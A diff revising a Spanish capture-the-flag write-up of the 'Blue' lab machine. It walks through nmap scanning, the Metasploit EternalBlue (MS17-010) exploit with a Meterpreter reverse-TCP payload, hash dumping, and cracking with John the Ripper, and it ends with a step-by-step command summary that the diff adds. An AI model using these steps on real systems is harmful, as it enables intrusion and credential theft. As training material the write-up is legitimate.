@@ -1,100 +1,98 @@
-# Write-up: Blue
+# Write-up Blue
 
 **Autor**: Asier González
 
 ## Reconocimiento
 
-La fase de reconocimiento comenzó con un escaneo completo de puertos, servicios y versiones mediante `nmap`:
+La fase de reconocimiento empezó con un escaneo completo de puertos, servicios y versiones con `nmap`:
 
 ```bash
 db_nmap -sC -sV -p- -T4 IP
 ```
 
-[Escaneo de puertos](images/nmap-p.png)
+![Escaneo de puertos](images/nmap-p.png)
 
-A continuación, ejecuté un escaneo orientado a vulnerabilidades para identificar posibles vectores de entrada:
+Después lanzo un escaneo orientado a vulnerabilidades para identificar posibles vectores de entrada:
 
 ```bash
 db_nmap -sV --script vuln IP
 ```
 
-[Detección de MS17-010](images/ms17.png)
+![Detección de MS17-010](images/ms17.png)
 
-Los resultados mostraron que el sistema era vulnerable a `MS17-010`, una vulnerabilidad crítica de SMB asociada al exploit EternalBlue.
+Los resultados muestran que el sistema es vulnerable a `MS17-010`, una vulnerabilidad crítica de SMB asociada al exploit EternalBlue.
 
-Para localizar un módulo adecuado en Metasploit, hice la siguiente búsqueda:
+Para localizar un módulo adecuado en Metasploit, hago la búsqueda:
 
 ```bash
 search smb ms17 010
 ```
 
-Seleccioné el módulo de EternalBlue:
+Y selecciono el módulo correspondiente:
 
 ```bash
 use exploit/windows/smb/ms17_010_eternalblue
 ```
 
-[Selección del exploit](images/exploit.png)
+![Selección del exploit](images/exploit.png)
 
 ## Explotación
 
-Una vez cargado el módulo, configuré los parámetros necesarios:
+Una vez cargado el módulo, configuro los parámetros necesarios:
 
-- `RHOSTS`: IP de la máquina víctima.
-- `PAYLOAD`: `windows/x64/meterpreter/reverse_tcp`.
-- `LHOST`: IP de mi interfaz VPN (`tun0`).
+- `RHOSTS`: IP de la máquina víctima
+- `PAYLOAD`: `windows/x64/meterpreter/reverse_tcp`
+- `LHOST`: IP de mi interfaz VPN
 
-Después lancé el exploit:
+Después lanzo el exploit:
 
 ```bash
 run
 ```
 
-También puede ejecutarse con:
+También se puede ejecutar con:
 
 ```bash
 exploit
 ```
 
-Si la explotación tiene éxito, puedes conseguir una shell `meterpreter` sobre la máquina objetivo.
+Si todo sale bien, obtengo una sesión de `meterpreter` en la máquina objetivo.
 
-Nota: este exploit puede fallar en algunos intentos, por lo que puede ser necesario ejecutarlo varias veces hasta que funcione.
+Nota: este exploit puede fallar en algunos intentos, así que a veces toca lanzarlo varias veces hasta que entre.
 
-[Sesión de meterpreter](images/meterpreter-in.png)
+![Sesión de meterpreter](images/meterpreter-in.png)
 
 ## Escalada de privilegios
 
-En este caso, la explotacion de `MS17-010` proporciona acceso directamente con privilegios elevados, por lo que no es necesaria una fase adicional de escalada manual.
+En esta máquina no necesito una fase adicional de escalada manual. La explotación de `MS17-010` ya me deja directamente con privilegios elevados.
 
 ## Post-explotación
 
 ### Verificación de privilegios
 
-Una vez dentro de la máquina, comprobé mis privilegios o usuario:
+Nada más entrar, compruebo el contexto con:
 
 ```bash
 getuid
 ```
 
-En este caso, obtuve acceso directamente con privilegios de systema:
-NT AUTHORITY\SYSTEM.
+El resultado confirma que ya estoy como `NT AUTHORITY\SYSTEM`.
 
-[Privilegios obtenidos](images/root.png)
+![Privilegios obtenidos](images/root.png)
 
 ### Extracción de hashes
 
-Como parte de la fase de post-explotación, extraje los hashes de los usuarios locales. Como tenía privilegios elevados, no hubo problemas:
+Como ya tengo privilegios elevados, vuelco los hashes locales sin problema:
 
 ```bash
 hashdump
 ```
 
-[Volcado de hashes](images/hashdump.png)
+![Volcado de hashes](images/hashdump.png)
 
 ### Preparación para crackeo
 
-Con los hashes obtenidos, el siguiente paso fue crackearlos. En mi caso usé John the Ripper.
-Lo primero que hice fue convertir esos hashes en archivos de texto para pasárselos a John.
+Con los hashes obtenidos, preparo archivos de texto para pasárselos a John the Ripper:
 
 ```bash
 echo "Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::" > hash.txt
@@ -102,28 +100,28 @@ echo "Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c
 echo "Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d::" >> hashjon.txt
 ```
 
-[Hashes exportados](images/toHashTxt.png)
+![Hashes exportados](images/toHashTxt.png)
 
-Observé que tanto `Administrator` como `Guest` comparten el valor:
+Veo que `Administrator` y `Guest` comparten este valor:
 
 ```text
 31d6cfe0d16ae931b73c59d7e0c089c0
 ```
 
-Esto normalmente es indicativo de que tienen la contraseña en blanco.
+Eso normalmente indica que tienen la contraseña en blanco.
 
 ### Crackeo de contraseñas
 
-La wordlist que usé fue `rockyou`, y el comando utilizado fue:
+La wordlist que uso es `rockyou`, con este comando:
 
 ```bash
 john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ```
 
-[Contraseña de Administrator](images/pass_admin.png)
-[Contraseña de Jon](images/pass_jon.png)
+![Contraseña de Administrator](images/pass_admin.png)
+![Contraseña de Jon](images/pass_jon.png)
 
-El único usuario con contraseña definida era `Jon`, cuya contraseña es:
+El único usuario con contraseña definida es `Jon`, cuya contraseña es:
 
 ```text
 alqfna22
@@ -131,45 +129,45 @@ alqfna22
 
 ## Obtención de flags
 
-El siguiente paso fue localizar las flags.
+El siguiente paso es localizar las flags.
 
-Desde la shell de meterpreter hice: `pwd` para ver donde estaba.
+Desde la shell de `meterpreter`, primero hago:
 
 ```bash
 pwd
 ```
 
-Me moví al directorio principal `cd /` e hice un `ls` para ver los archivos.
+Después me muevo al directorio raíz y listo el contenido:
 
 ```bash
 cd /
 ls
 ```
 
-Allí encontré la primera flag, almacenada en `flag1.txt`.
+Ahí encuentro la primera flag, `flag1.txt`.
 
-[Ubicación de la primera flag](images/flag1.png)
+![Ubicación de la primera flag](images/flag1.png)
 
-La leí con:
+La leo con:
 
 ```bash
 cat flag1.txt
 ```
 
-[Lectura de flag1](images/catFlag1.png)
+![Lectura de flag1](images/catFlag1.png)
 
-Al ser una máquina fácil, supuse que respetaría el mismo formato de archivo, así que decidí hacer una búsqueda en el sistema con `search -f flag*.txt` y obtuve la dirección de todas las flags.
+Como la máquina es fácil, supongo que las demás flags seguirán el mismo patrón, así que hago una búsqueda general:
 
 ```bash
 search -f flag*.txt
 ```
 
-[Búsqueda de flags](images/searchflags.png)
+![Búsqueda de flags](images/searchflags.png)
 
-Con las rutas identificadas, solo me quedaba acceder a cada ubicación y leer los archivos:
+Con las rutas identificadas, solo queda entrar en cada ubicación y leer los archivos.
 
-[Lectura de flag2](images/catflag2.png)
-[Lectura de flag3](images/catflag3.png)
+![Lectura de flag2](images/catflag2.png)
+![Lectura de flag3](images/catflag3.png)
 
 ## Resultado
 
@@ -190,3 +188,15 @@ Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
 ### Credencial recuperada
 
 - `Jon`: `alqfna22`
+
+## Resumen de comandos directo a SYSTEM/root
+
+1. `db_nmap -sC -sV -p- -T4 IP`
+2. `db_nmap -sV --script vuln IP`
+3. `search smb ms17 010`
+4. `use exploit/windows/smb/ms17_010_eternalblue`
+5. `set RHOSTS IP`
+6. `set PAYLOAD windows/x64/meterpreter/reverse_tcp`
+7. `set LHOST TU_IP`
+8. `run`
+9. `getuid`
